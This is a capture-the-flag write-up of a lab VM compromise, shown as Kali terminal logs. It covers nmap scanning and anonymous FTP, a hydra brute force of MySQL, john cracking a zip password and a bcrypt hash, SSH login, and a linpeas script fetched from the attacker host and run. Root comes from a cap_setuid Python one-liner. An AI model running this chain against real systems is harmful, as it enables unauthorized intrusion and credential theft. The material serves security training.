@@ -1,0 +1,459 @@
+			ENUMERATION
+			
+---ifconfig---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 4074684  bytes 1848715892 (1.7 GiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 4117775  bytes 599442516 (571.6 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 120  bytes 8744 (8.5 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 120  bytes 8744 (8.5 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+---netdiscover---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts               
+                                                                               
+ 8 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 480               
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      2     120  Unknown vendor              
+ 10.0.2.2        52:54:00:12:35:00      2     120  Unknown vendor              
+ 10.0.2.3        08:00:27:57:eb:9f      2     120  PCS Systemtechnik GmbH      
+ 10.0.2.42       08:00:27:e8:2d:f3      2     120  PCS Systemtechnik GmbH      
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+               
+
+
+
+
+---nmap---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.42 -sS -sC -sV -A -T4 -p-    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 14:48 +03
+Nmap scan report for 10.0.2.42
+Host is up (0.00085s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT     STATE  SERVICE  VERSION
+20/tcp   closed ftp-data
+21/tcp   open   ftp      vsftpd 3.0.5
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.0.2.15
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+22/tcp   open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 02:d6:5e:01:45:5b:8d:2d:f9:cb:0b:df:45:67:04:22 (ECDSA)
+|_  256 f9:ce:4a:75:07:d0:05:1d:fb:a7:a7:69:39:1b:08:10 (ED25519)
+80/tcp   open   http     Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Fastgym
+3306/tcp open   mysql    MySQL 8.0.35-0ubuntu0.22.04.1
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=MySQL_Server_8.0.35_Auto_Generated_Server_Certificate
+| Not valid before: 2023-11-22T19:44:52
+|_Not valid after:  2033-11-19T19:44:52
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.35-0ubuntu0.22.04.1
+|   Thread ID: 29
+|   Capabilities flags: 65535
+|   Some Capabilities: DontAllowDatabaseTableColumn, SupportsTransactions, InteractiveClient, ODBCClient, ConnectWithDatabase, Speaks41ProtocolOld, Support41Auth, FoundRows, LongColumnFlag, SwitchToSSLAfterHandshake, LongPassword, IgnoreSigpipes, Speaks41ProtocolNew, SupportsCompression, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: \x16@\BR*\x08"\x07%]\x14t\x07y~%\x0E|\x1C
+|_  Auth Plugin Name: caching_sha2_password
+MAC Address: 08:00:27:E8:2D:F3 (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: Linux 5.0 - 5.4 (98%), Linux 4.15 - 5.8 (94%), Linux 5.0 - 5.5 (93%), Linux 5.1 (93%), Linux 2.6.32 - 3.13 (93%), Linux 2.6.39 (93%), Linux 5.0 (92%), Linux 2.6.22 - 2.6.36 (91%), Linux 3.10 - 4.11 (91%), Linux 3.10 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.85 ms 10.0.2.42
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 369.75 seconds
+                        
+
+
+
+---here we see that we have open ftp, ssh, http, mysql ports---
+
+
+
+---we see that there is anonymous ftp login, lets try it---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ftp 10.0.2.42
+Connected to 10.0.2.42.
+220 (vsFTPd 3.0.5)
+Name (10.0.2.42:okina): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||7810|)
+^C
+receive aborted. Waiting for remote to finish abort.
+ftp> passive
+Passive mode: off; fallback to active mode: off.
+ftp> ls
+200 EPRT command successful. Consider using EPSV.
+
+421 Service not available, remote server timed out. Connection closed.
+ftp> 
+
+
+---there may occur a problem because of passive mode in the terminal, to disable it simply juts type "passive" in ftp terminal---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLOWMAN LINUX CTF]
+└─# touch allowedusersmysql.txt               
+                                                                                                                             
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLOWMAN LINUX CTF]
+└─# ls
+allowedusersmysql.txt  slowman_linux_os_ctf_writeup.txt
+                                                                                                                             
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLOWMAN LINUX CTF]
+└─# nano allowedusersmysql.txt               
+                                                                                                                             
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLOWMAN LINUX CTF]
+└─# cat allowedusersmysql.txt            
+trainerjeff
+
+
+---this is the name we get from the ftp---
+
+---now that we have the username, we can bruteforce the password to learn the credentials for a mysql login---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLOWMAN LINUX CTF]
+└─# hydra -l trainerjeff -P /home/okina/wordlists/rockyou.txt  mysql://10.0.2.42
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-24 17:35:18
+[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking mysql://10.0.2.42:3306/
+[3306][mysql] host: 10.0.2.42   login: trainerjeff   password: soccer1
+
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-24 17:35:28
+                                        
+
+
+---we learn that username=trainerjeff password=soccer1---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLOWMAN LINUX CTF]
+└─# mysql -u trainerjeff -h 10.0.2.42 -p        
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 1068
+Server version: 8.0.35-0ubuntu0.22.04.1 (Ubuntu)
+
+
+---we are in, lets look around---
+
+
+MySQL [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| trainers_db        |
++--------------------+
+5 rows in set (0.007 sec)
+
+MySQL [(none)]> select trainers_db;
+ERROR 1054 (42S22): Unknown column 'trainers_db' in 'field list'
+MySQL [(none)]> show trainers_db;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'trainers_db' at line 1
+MySQL [(none)]> use trainers_db
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [trainers_db]> show tables;
++-----------------------+
+| Tables_in_trainers_db |
++-----------------------+
+| users                 |
++-----------------------+
+1 row in set (0.002 sec)
+
+MySQL [trainers_db]> select * FROM users;
++----+-----------------+-------------------------------+
+| id | user            | password                      |
++----+-----------------+-------------------------------+
+|  1 | gonzalo         | tH1sS2stH3g0nz4l0pAsSWW0rDD!! |
+|  2 | $SECRETLOGINURL | /secretLOGIN/login.html       |
++----+-----------------+-------------------------------+
+2 rows in set (0.002 sec)
+
+
+
+---here we see that there is a secret url and some user credentials to access it, lets go to the 
+http://10.0.2.42/secretLOGIN/login.html webpage and log in---
+
+
+---after logging in I discover a folder with a zip file in it named credentials.zip, I download it to my Desktop---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# cd Desktop                           
+                                                                                                                             
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# ls
+NOTLAR  credentials.zip
+                                                                                                                             
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# zip2john credentials.zip | cut -d ':' -f 2 > credentials.txt            
+ver 2.0 efh 5455 efh 7875 credentials.zip/passwords.txt PKZIP Encr: TS_chk, cmplen=117, decmplen=117, crc=4981406D ts=9E02 cs=9e02 type=8
+
+                                                                                                                             
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# john credentials.txt                                        
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+spongebob1       (?)     
+1g 0:00:00:00 DONE 2/3 (2024-04-24 17:46) 11.11g/s 136533p/s 136533c/s 136533C/s fireballs..pepper1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                       
+
+---the password of the file is spongebob1, I love john. Now that we learned it lets unzip it---
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# unzip credentials.zip 
+Archive:  credentials.zip
+[credentials.zip] passwords.txt password: 
+  inflating: passwords.txt           
+                                                                                                                             
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# ls
+NOTLAR  credentials.txt  credentials.zip  passwords.txt
+                                                                                                                             
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# cat passwords.txt           
+----------
+$USERS: trainerjean
+
+$PASSWORD: $2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq 
+---------- 
+
+
+---here we get the password hash of user trainerjean, lets crack it with john---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# echo "$2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq" > jeanpasswordhash.txt
+     
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# cat jeanpasswordhash.txt 
+$2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq
+    
+
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# john jeanpasswordhash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+tweety1          (?)     
+1g 0:00:01:52 DONE 2/3 (2024-04-24 17:55) 0.008891g/s 94.74p/s 94.74c/s 94.74C/s theking1..warriors1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                    
+
+--- username=trainerjean password=tweety1 ---
+
+
+---lets ssh into it---
+
+
+
+
+			GAINING FOOTHOLD
+
+			
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# ssh trainerjean@10.0.2.42
+The authenticity of host '10.0.2.42 (10.0.2.42)' can't be established.
+ED25519 key fingerprint is SHA256:gyWF404zV4bL8gskLfXbChI0buZepNktuMGUNM23CHQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.2.42' (ED25519) to the list of known hosts.
+trainerjean@10.0.2.42's password: 
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Fri Nov 24 19:53:52 2023 from 192.168.2.5
+trainerjean@slowman:~$ ls
+user.txt
+trainerjean@slowman:~$ cat user.txt 
+---First User Flag--- 
+
+			
+
+---I check around---
+
+trainerjean@slowman:~$ ls -la
+total 40
+drwxr-x--- 5 trainerjean trainerjean 4096 abr 24 15:02 .
+drwxr-xr-x 5 root        root        4096 nov 23 21:23 ..
+lrwxrwxrwx 1 root        root           9 nov 23 21:22 .bash_history -> /dev/null
+-rw-r--r-- 1 trainerjean trainerjean  220 nov 22 19:29 .bash_logout
+-rw-r--r-- 1 trainerjean trainerjean 3771 nov 22 19:29 .bashrc
+drwx------ 2 trainerjean trainerjean 4096 nov 22 19:30 .cache
+drwx------ 3 trainerjean trainerjean 4096 abr 24 15:02 .gnupg
+-rw-r--r-- 1 trainerjean trainerjean  807 nov 22 19:29 .profile
+-rw------- 1 trainerjean trainerjean   77 nov 23 21:44 .python_history
+drwx------ 3 trainerjean trainerjean 4096 abr 24 15:02 snap
+-rw-r--r-- 1 root        root          29 nov 23 19:52 user.txt
+
+
+---we see a hidden python file, lets check the contents of it---
+
+
+trainerjean@slowman:~$ cat .python_history 
+import os
+os.system('bash')
+os.system('0')
+os.setid('0')
+os.setuid('0')
+exit
+
+
+
+---looks like we can run a python priv escelate to get root, I also want to check with linpeas to find some more
+clues---
+
+			
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# python3 -m http.server 8000                      
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.0.2.42 - - [24/Apr/2024 18:00:12] "GET /linpeas.sh HTTP/1.1" 200 -
+
+
+trainerjean@slowman:/opt$ cd /tmp
+trainerjean@slowman:/tmp$ wget http://10.0.2.15:8000/linpeas.sh
+--2024-04-24 15:00:15--  http://10.0.2.15:8000/linpeas.sh
+Connecting to 10.0.2.15:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 860549 (840K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                      100%[====================================================>] 840,38K  --.-KB/s    in 0,03s   
+
+2024-04-24 15:00:15 (30,9 MB/s) - ‘linpeas.sh’ saved [860549/860549]
+
+
+
+trainerjean@slowman:/tmp$ bash linpeas.sh
+
+
+/usr/bin/python3.10 cap_setuid=ep
+
+
+
+---I come accross this line as a priv escalate threat, I decide to run it with what I find in gtfobins---
+
+
+trainerjean@slowman:/tmp$ sudo /usr/bin/python3.10 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+[sudo] password for trainerjean: 
+trainerjean is not in the sudoers file.  This incident will be reported.
+
+
+---didnt work, I will try another one---
+
+trainerjean@slowman:/tmp$ sudo /usr/bin/python3.10 -c 'import os; os.system("/bin/sh")'
+[sudo] password for trainerjean: 
+trainerjean is not in the sudoers file.  This incident will be reported.
+
+
+---this one didn't work as well, gotta keep on tryin---
+
+
+
+			
+			PRIVILEGE ESCALATION
+
+
+---so far we learned that we can run a python priv escalate with suid capabilites so I once again check 
+gtfobins for any priv escalation options---
+
+
+---found one that says if the binary has the Linux CAP_SETUID capability set or it is executed by another 
+binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its 
+own process UID, lets use this one---
+
+
+
+trainerjean@slowman:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# whoami
+root
+# cd /root
+# ls
+root.txt  snap
+# cat root.txt	
+---Root User Flag---
+
+
+
